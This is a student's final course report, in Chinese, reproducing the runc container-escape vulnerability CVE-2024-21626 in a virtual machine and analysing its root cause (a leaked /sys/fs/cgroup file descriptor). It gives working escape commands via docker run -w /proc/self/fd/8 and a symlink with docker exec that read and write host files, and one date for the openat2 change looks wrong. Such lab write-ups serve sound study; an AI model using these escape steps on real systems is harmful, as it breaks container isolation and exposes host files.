# 期末报告：CVE-2024-21626容器逃逸漏洞复现

<center>520030910281 肖真然<certer>

[TOC]



## 漏洞说明[^1][^2][^3]

2023年12月19日，runc社区收到来自docker社区转发过来的安全通告，来自Snyk的Rory McNamara研究发现，在1.1.11或更早版本的runc中，由于一个文件描述符泄露bug，攻击者可以通过容器的“工作目录”参数（`.process.cwd`，对应的docker的参数为`--workdir`），利用这个泄露的文件描述符，控制容器所在主机的整个文件系统。这是一个高危漏洞，10分制危害评分等级为8.6分。该漏洞在runc 1.1.12版本中被修复。



## Docker与runC[^4][^5]

runC是一个轻量级的命令行工具，专门用于根据OCI（Open Container Initiative）规范在Linux上生成和运行容器。它是Open Container Initiative的一部分，负责管理和执行容器中的进程。runC通过创建和管理Linux命名空间、控制组（cgroups）和文件系统挂载等功能，实现了容器的隔离性和资源限制。此外，runC还提供了容器的生命周期管理功能，包括启动、停止、暂停、恢复和删除容器等操作。

在Docker中，runC扮演着底层容器运行时的角色。当使用Docker构建镜像并启动容器时，Docker会调用runC来创建和运行一个新的容器进程。runC利用Linux内核的特性，如命名空间和控制组，来确保容器内的进程、网络和文件系统等资源得到隔离和限制。这使得多个容器可以在同一台主机上独立运行，而不会相互干扰。

除了作为Docker的底层运行时，runC还可以作为一个独立的工具来手动创建和管理容器。通过runC的命令行接口，用户可以指定容器的配置，如根文件系统、挂载目录和网络配置等，并控制容器的生命周期。这使得开发人员能够更灵活地管理和调试容器化应用程序。

尽管runC和Docker都涉及容器的创建和管理，但它们各自扮演不同的角色。Docker是一个更高级别的容器管理工具，提供了丰富的功能和用户友好的界面，用于构建、运行和管理容器化应用程序。而runC则更加底层和专注，它提供了基础的容器运行时功能，与OCI规范紧密相关，使得容器在不同的环境中具有更好的可移植性和互操作性。

总结来说，runC是一个轻量级的容器运行时工具，用于根据OCI规范创建和管理容器。在Docker中，它作为底层运行时工具，确保容器的隔离性和可靠性。同时，runC也可以作为独立的命令行工具使用，提供灵活的容器管理功能。无论是与Docker结合使用还是单独使用，runC都为容器化应用程序的创建、运行和管理提供了强大的支持。



## 实验环境

### 虚拟机

+ VMware Workstation 16 pro

+ Ubuntu 22.04.3 LTS



### 安装Docker[^6]

1. 卸载所有可能冲突的包体。

   ```shell
   $ for pkg in docker.io docker-doc docker-compose docker-compose-v2 podman-docker containerd runc; do sudo apt-get remove $pkg; done
   ```

   如果之前没有安装过Docker，`apt-get` 可能会报告这些软件包并未被安装。

2. 设置Docker的apt仓库。

   ```shell
   # Add Docker's official GPG key:
   $ sudo apt-get update
   $ sudo apt-get install ca-certificates curl
   $ sudo install -m 0755 -d /etc/apt/keyrings
   $ sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
   $ sudo chmod a+r /etc/apt/keyrings/docker.asc
   
   # Add the repository to Apt sources:
   $ echo \
         "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
         $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
         sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
   $ sudo apt-get update
   ```

3. 安装最新版本的Docker。

   ```shell
   $ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
   ```

4. 通过运行hello-world镜像来验证Docker引擎的安装是否成功。

   ```shell
   $ sudo docker run hello-world
   ```

   该命令下载一个测试映像并在容器中运行它。当容器成功运行时，它打印一条确认消息并退出。

5. 查看Docker和runc的版本。

   ```shell
   $ docker --version
   $ runc --version
   ```

   <img src=".\docker安装完成.png" style="zoom:80%;" />



### 回退runC版本[^7][^8]

1. 下载旧版本的runc。

   [Releases · opencontainers/runc]: https://github.com/opencontainers/runc/releases/

   ```shell
   $ wget https://github.com/opencontainers/runc/releases/download/v1.1.11/runc.amd64
   ```

   ![](.\下载旧版本runc.png)

2. 修改文件名并赋予权限。

   ```shell
   $ mv runc.amd64 runc && chmod +x runc
   ```

3. 备份原有的runc。

   ```shell
   $ sudo mv /usr/bin/runc /usr/bin/runcbak
   ```

4. 停止Docker。

   ```shell
   $ systemctl stop docker
   ```

5. 替换runc。

   ```shell
   $ sudo cp runc /usr/bin/runc
   ```

6. 启动Docker。

   ```shell
   $ systemctl start docker
   ```

   ![](.\替换runc.png)

7. 检查runc版本。

   ```shell
   $ sudo docker version
   ```

   ![](.\runc版本替换成功.png)



### 准备Docker镜像[^9]

1. 在默认情况下，Docker将拉取的镜像存储在`/var/lib/docker`目录下。

   ```shell
   $ sudo docker info | grep "Docker Root Dir"
   ```

2. 拉取一个Ubuntu镜像。

   ```shell
   $ sudo docker pull ubuntu:latest
   ```

3. 查看镜像。

   ```shell
   $ sudo docker images
   ```

![](.\拉取一个共享ubuntu镜像.png)



## 复现漏洞[^10]

### 方法一：指定工作目录为`/proc/self/fd/`

1. 运行容器。

   ```shell
   $ sudo docker run -w /proc/self/fd/8 --name cve-2024-21626 --rm ubuntu:latest
   ```

   > -w：指定容器的工作目录。
   >
   > --name：为容器指定一个名称。
   >
   > --rm：当容器退出时自动删除它。
   >
   > https://docs.docker.com/reference/cli/docker/container/run/

   将容器的工作目录设置为 `/proc/self/fd/<fd>` ，`<fd>`表示在主机文件系统中打开 `/sys/fs/cgroup` 时的文件描述符。当运行一个容器时，`<fd>`通常是7或8。

2. 尝试读取主机文件内容。

   ```shell
   # cat ../../../../etc/hostname
   ```

   能够读取主机文件`hostname`中的内容：xiaozhenran-virtual-machine。

   ![](.\攻击方式1-1.png)

3. 尝试写入主机文件。

   ```shell
   # echo "Hello Computer System Security 2024!" > ../../../../home/xiaozhenran/cve-2024-21626.txt
   ```
   
   能够写入内容到宿主机文件：Hello Computer System Security 2024!

   ![](.\攻击方式1-2.png)

   ![](.\攻击方式1-3.png)



### 方法二：利用`docker exec`

1. 运行容器。

   ```shell
   $ sudo docker run --name cve-2024-21626 --rm -it ubuntu:latest
   ```

2. 创建一个symlink。

   ```shell
   # ln -sf /proc/self/fd/7/foo /foo
   ```

   为 `/proc/self/fd/<fd>` 创建一个symlink，\<fd\>表示在主机文件系统中打开 `/sys/fs/cgroup` 时的文件描述符。当运行一个容器时，`<fd>`通常是7或8。

3. 执行 `docker exec` 命令，带 `-w` 选项，从而在容器中执行 `sleep` 命令。

   ```shell
   $ sudo docker exec -it -w /foo cve-2024-21626 sleep 300
   ```

   通过-w选项设置上一步创建的symlink为执行指令的目录。

4. 在容器中找到sleep指令对应的PID。

   ```shell
   # ls -F /proc
   ```

   这里为20。

5. 通过 `/proc/<PID>/cwd` 尝试访问宿主机文件系统。`<PID>` 代表由docker exec生成的进程的标识符。

   ```shell
   # cat /proc/20/cmdline
   # cat /proc/20/cwd/../../../../etc/hostname
   ```

   能够读取主机文件`hostname`中的内容：xiaozhenran-virtual-machine。

<img src=".\攻击方式2-1.png" style="zoom:80%;" />

<img src=".\攻击方式2-2.png" style="zoom:80%;" />

<img src=".\攻击方式2-3.png" style="zoom:80%;" />



## 漏洞分析[^10]

### Docker如何调用runC

当使用`docker run`命令运行容器时，`dockerd`、`containerd`、`containerd-shim-runc-v2`和`runc`之间的调用关系如下：

<img src=".\How Docker Engine Calls runC.png" style="zoom:67%;" />

- Docker引擎（dockerd）通过`/run/containerd/containerd.sock`调用`containerd`的RPC方法，以创建和运行容器。

- `containerd`执行`containerd-shim-runc-v2`命令，通过UNIX域套接字运行一个独立的RPC服务。该套接字路径默认存储在`/run/containerd/io.containerd.v2.task/moby/<containerID>/address`文件中。RPC服务的定义位于`/api/runtime/task/v3/shim.proto`文件中[^11]。

- 当`containerd`调用`containerd-shim-runc-v2`的`Create`方法来创建容器时，`containerd-shim-runc-v2`执行`runc create`命令。当`containerd`调用`containerd-shim-runc-v2`的`Start`方法来启动容器时，`containerd-shim-runc-v2`执行`runc start`命令。


此外，`containerd`创建了一个名为`github.com/containerd/go-runc`的包，用于封装对runC的操作的调用。



### 漏洞发生原因

<img src=".\How the Vulnerability Happened.png" style="zoom: 67%;" />

当使用Docker运行容器时，runc首先会创建一个`libcontainer.linuxContainer`对象[^12]。为了创建该对象，runC需要创建一个名为`cgroups.Manager`的接口对象[^13]，该对象用于管理cgroupfs。它会打开主机文件系统中的`/sys/fs/cgroup`目录[^14]，而后续对cgroup文件的操作都是基于`openat2(2)`系统调用和`/sys/fs/cgroup`的文件描述符进行的[^15]。然而，runC在创建子进程时未及时关闭`/sys/fs/cgroup`的文件描述符，导致子进程可以通过`/proc/self/fd/<fd>`访问主机文件系统。

如果调用`openat2(2)`系统调用失败（比如`openat2(2)`不存在），runC会调用`openFallback()`函数，使用绝对路径打开cgroup文件。



### runC为何会使用`openat2(2)`

runC在2024年12月4日的第4个版本中，即`v1.0.0-rc93`，增加了对`openat2(2)`的支持[^16]。简而言之，主要是为了在将主机文件系统中的目录挂载到容器的挂载命名空间时预防潜在的安全风险。详细解释可以参考《Mounting into mount namespaces》这篇文章[^17]和`openat2(2)`的手册。



### 为什么`/sys/fs/cgroup`的文件描述符是7

这与Go语言的runtime有关。首先，文件描述符0、1和2必然分别代表stdin、stdout和stderr。由`--log`参数指定的日志文件的文件描述符是3。Go的runtime随后会调用`epoll_create(2)`创建文件描述符4，并通过`pipe(2)`创建两个文件描述符5和6。综上所述，打开`/sys/fs/cgroup`会创建文件描述符7。之所以先打开日志文件，然后Go语言运行时调用`epoll_create(2)`和`pipe2(2)`，这与Go的runtime的实现有关，在此不做详述。



### 使用docker exec运行容器时，为何`/sys/fs/cgroup`的文件描述符为8

根据5.1可知，`containerd-shim-runc-v2`调用runc命令，并且`containerd-shim-runc-v2`在执行runC之前通过UNIX域套接字提供RPC服务，因此代表UNIX域套接字的文件描述符错误地被传递给了runC进程。

在《Illustrate runC Escape Vulnerability CVE-2024-21626》[^10]一文中，作者在`nsexec.c`文件中的`nsexec()`函数开头添加一行调用`sleep()`函数的代码。可以得到`containerd-shim-runc-v2`和`runc create`之间的文件描述符关系。

<img src="D:.\rpc-socket-passed-to-runc.png" style="zoom:67%;" />

由于添加的sleep函数，`runc create`进程在被创建后会立即被阻塞。从上图可以看到，`runc create`进程有4个文件描述符：

- 0代表stdin。它已被重定向到`/dev/null`，因为`containerd-shim-runc-v2`不需要向runC发送任何输入数据。
- 1和2分别代表stdout和stderr。它们指向`containerd-shim-runc-v2`中的同一个管道，因为`containerd-shim-runc-v2`想要收集并存储它们。
- 3代表用于提供RPC服务的UNIX域套接字。

<img src=".\sys-fs-cgroup-with-fd-8.png" style="zoom:67%;" />

截图中的PID 1374988代表`runc:[2:INIT]`进程，该进程在调用`execve(2)`后将变成容器进程。我们可以看到，`/sys/fs/cgroup`的文件描述符是8，这正是由于提供RPC服务的UNIX域套接字导致的！

> 仍不清楚为何有时通过`docker exec`运行容器时，/sys/fs/cgroup的文件描述符仍为7。猜测这仍与Go的runtime有关。



## 总结

CVE-2024-21626利用linux的伪文件系统`/proc`进行攻击，容器运行时runC在启动真实的容器进程之前，其实是通过`/proc/self/exe init`创建的一个进程（以下简称init进程），在设置完资源隔离和资源限制后，通过`execve`系统调用来启动真正的容器进程[^2]。在容器进程真正启动之前，其实一直是runC在工作，runC进程其实是某个容器的第一个进程，所以runC进程本身是已经泄漏到容器空间当中的。在runC的某些代码重构过程中，不小心把两个主机文件描述符`/sys/fs/cgroup`泄漏到了init进程，导致了本次逃逸的发生。



## Reference

[^1]: [several container breakouts due to internally leaked fds · Advisory · opencontainers/runc](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
[^2]: [CVE-2024-21626容器逃逸漏洞提醒-阿里云开发者社区](https://developer.aliyun.com/article/1435422)
[^3]: [CVE-2024-21626：runc容器逃逸漏洞-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2387931)
[^4]: [opencontainers/runc: CLI tool for spawning and running containers according to the OCI specification](https://github.com/opencontainers/runc)
[^5]: [runc和docker-CSDN博客](https://blog.csdn.net/m0_37749659/article/details/132960267)
[^6]: [Install Docker Engine on Ubuntu | Docker Docs](https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository)
[^7]: [docker runc 版本升级-CSDN博客](https://blog.csdn.net/qq_36287702/article/details/122449419)
[^8]: [【CVE-2024-21626】容器逃逸漏洞修复-CSDN博客](https://blog.csdn.net/s_alted/article/details/136217624)
[^9]:[全网最详细Docker镜像教程-CSDN博客](https://blog.csdn.net/2301_77081516/article/details/134547443) 
[^10]:[Illustrate runC Escape Vulnerability CVE-2024-21626](https://nitroc.org/en/posts/cve-2024-21626-illustrated/)
[^11]: [containerd/api/runtime/task/v3/shim.proto · containerd/containerd](https://github.com/containerd/containerd/blob/96bf529cbf55940ddb96bb8adc8be51b11922ebb/api/runtime/task/v3/shim.proto)
[^12]: [runc/utils_linux.go#L195 · opencontainers/runc](https://github.com/opencontainers/runc/blob/4bccb38cc9cf198d52bebf2b3a90cd14e7af8c06/utils_linux.go#L195)
[^13]: [runc/libcontainer/factory_linux.go#L147 · opencontainers/runc](https://github.com/opencontainers/runc/blob/4bccb38cc9cf198d52bebf2b3a90cd14e7af8c06/libcontainer/factory_linux.go#L147)
[^14]: [runc/libcontainer/cgroups/file.go#L86 · opencontainers/runc](https://github.com/opencontainers/runc/blob/4bccb38cc9cf198d52bebf2b3a90cd14e7af8c06/libcontainer/cgroups/file.go#L86)
[^15]: [runc/libcontainer/cgroups/file.go#L119 · opencontainers/runc](https://github.com/opencontainers/runc/blob/4bccb38cc9cf198d52bebf2b3a90cd14e7af8c06/libcontainer/cgroups/file.go#L119)
[^16]: [libcontainer/cgroups/fscommon: add openat2 support · opencontainers/runc](https://github.com/opencontainers/runc/commit/6bda4600003e145f5aff4dd8d9d2d5866fc44ce9)
[^17]: [Mounting into mount namespaces — Christian Brauner](https://people.kernel.org/brauner/mounting-into-mount-namespaces)
